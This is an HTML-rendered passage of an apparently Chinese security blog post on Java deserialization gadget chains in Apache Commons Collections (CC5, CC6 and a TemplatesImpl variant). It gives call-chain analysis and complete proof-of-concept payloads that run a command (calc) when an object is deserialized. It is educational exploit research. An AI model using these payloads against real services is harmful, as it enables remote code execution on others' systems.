templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151145397.png" alt="image-20220215114530193"></p>
<p>是成功了。</p>
<h4 id="扩展-1"><a href="#扩展-1" class="headerlink" title="- 扩展 -"></a>- 扩展 -</h4><p>搁着排列组合呢，再来排个链吧。</p>
<p>比如 <code>TransformerFactoryImpl</code> 类的 <code>newTransformerHandler</code> 方法👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TransformerFactoryImpl.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newInstance&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformerHandler&quot;</span>,<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151155113.png" alt="image-20220215115513899"></p>
<p>也是可以的。</p>
<h3 id="CC5"><a href="#CC5" class="headerlink" title="- CC5 -"></a>- CC5 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="调用结构-4"><a href="#调用结构-4" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">	👇</span><br><span class="line">	TiedMapEntry.toString()</span><br><span class="line">	👇</span><br><span class="line">	LazyMap.get()</span><br><span class="line">	👇</span><br><span class="line">	ChainedTransformer.transform()</span><br><span class="line">	👇</span><br><span class="line">	ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    👇</span><br><span class="line">    InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    👇</span><br><span class="line">    InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    👇</span><br><span class="line">    InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="分析-6"><a href="#分析-6" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>这个在 <code>CC链</code> 中应该是比较短的链了，后半段和 <code>CC1</code> 链差不多，就是前半段对 <code>[(Map)可控].get</code> 的调用过程不同罢。</p>
<p>先来看 <code>BadAttributeValueExpException</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151204850.png" alt="image-20220215120411712"></p>
<p>首先 <code>BadAttributeValueExpException</code> 类属于 <code>Exception</code> 子类，而 <code>Exception</code> 类是可以序列化的，进而 <code>BadAttributeValueExpException</code> 也是可以序列化的；再看 <code>readObject</code> 方法，倘若 <code>System.getSecurityManager() == null</code> 成立就会执行 <code>val = valObj.toString()</code> ，其中 <code>valObj</code> 变量来自 <code>val</code> 属性序列化的值，也就是可控且可序列化的。</p>
<p>那么跟进 <code>System.getSecurityManager()</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151207142.png" alt="image-20220215120745086"></p>
<p>可见默认的返回值为 <code>null</code> ，也就会往下执行 <code>val = valObj.toString()</code> 了。只是需要注意的是不能够直接通过构造方法来控制 <code>val</code> 属性的值，得用反射，否则就会提前执行 <code>val = valObj.toString()</code> 。</p>
<p>由于 <code>val</code> 属性类型为 <code>Object</code> ，现在就拥有了 <code>[可控].toString()</code> 的结构了。</p>
<p>跟进 <code>TiedMapEntry</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151213550.png" alt="image-20220215121356428"></p>
<p>先来看 <code>TiedMapEntry</code> 类的 <code>toString</code> 方法，存在对 <code>getValue</code> 方法的调用，而 <code>getValue</code> 方法中又有 <code>return this.map.get(this.key)</code> 语句；其中 <code>this.map</code> 属性类型为 <code>Map</code> 且可控可序列化，假若将 <code>this.map</code> 属性的值设为 <code>LazyMap</code> 类，进而就可以用有关 <code>Transformer</code> 的调用 <code>payload</code> 了。</p>
<p>并且 <code>TiedMapEntry</code>  类的 <code>this.map</code> 属性可以由构造方法直接赋值，还是比较方便的。</p>
<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="- payload -"></a>- payload -</h4><p>在构造 <code>payload</code> 时只需要注意 <code>BadAttributeValueExpException</code> 类的 <code>val</code> 属性必须由反射构造，剩下的按照分析进行拼接就好了👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test5</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关Transformer的payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TiedMapEntry</span></span><br><span class="line">        TiedMapEntry tm = <span class="keyword">new</span> TiedMapEntry(map,Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造BadAttributeValueExpException</span></span><br><span class="line">        BadAttributeValueExpException bave = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bave,<span class="string">&quot;val&quot;</span>,tm);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(bave);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151228583.png" alt="image-20220215122820368"></p>
<p>是成功了。</p>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="- CC6 -"></a>- CC6 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>Commons Collections 3.2.0</code></li>
</ul>
<h4 id="调用结构-5"><a href="#调用结构-5" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HashSet.readObject()</span><br><span class="line">	👇</span><br><span class="line">	HashMap.put()</span><br><span class="line">	👇</span><br><span class="line">	HashMap.<span class="built_in">hash</span>()</span><br><span class="line">		👇</span><br><span class="line">    	TiedMapEntry.hashCode()</span><br><span class="line">        👇</span><br><span class="line">        TiedMapEntry.getValue()</span><br><span class="line">        👇</span><br><span class="line">        LazyMap.get()</span><br><span class="line">        👇</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		👇</span><br><span class="line">		ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">    	👇</span><br><span class="line">    	InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">    	👇</span><br><span class="line">    	InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">    	👇</span><br><span class="line">    	InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h4 id="分析-7"><a href="#分析-7" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>这个也是改了前半段，后面的还是旧东西了，先来看 <code>HashSet</code> 类的 <code>readObject</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151244841.png" alt="image-20220215124417717"></p>
<p>这个 <code>HashSet</code> 类显然是可序列化的，在其 <code>readObject</code> 会依次读取所存入的 <code>map</code> 属性的内容，然后去调用 <code>map.put</code> ，其中键名的值来自 <code>map</code> 属性。</p>
<p>再看 <code>writeObject</code> 方法，其实就是将 <code>map</code> 属性写入序列化内容中👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151247444.png" alt="image-20220215124746370"></p>
<p>这个 <code>map</code> 属性也就可以看作是可控且可序列化的了，那么继续跟进 <code>map.put</code> 的调用，其实也就是 <code>HashMap</code> 类的 <code>put</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151251209.png" alt="image-20220215125150124"></p>
<p>由于键名的值是可控的，<code>hash(key.hashCode())</code> 就相当于 <code>[可控].hashCode()</code> 的结构。</p>
<p>跟进 <code>TiedMapEntry</code> 类的 <code>hashCode</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151255338.png" alt="image-20220215125535292"></p>
<p>可以看到调用了自身的 <code>getValue</code> 方法，跟进 <code>getValue</code> 方法就是回到了 <code>CC5</code> 链的中段了👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151256405.png" alt="image-20220215125630362"></p>
<p>其实主要来说也就是调用到 <code>TiedMapEntry</code> 类的 <code>getValue</code> 方法前半段过程相较于 <code>CC5</code> 链不同罢了。</p>
<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="- payload -"></a>- payload -</h4><p>简单来说稍微的替换一下 <code>CC5</code> 链的前半段就可以了，当然由于 <code>HashSet</code> 类做的是成全 <code>[可控].hashCode()</code> 的结构，其他的类如果能满足也是可以的，比如 <code>Hashtable</code> 类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span 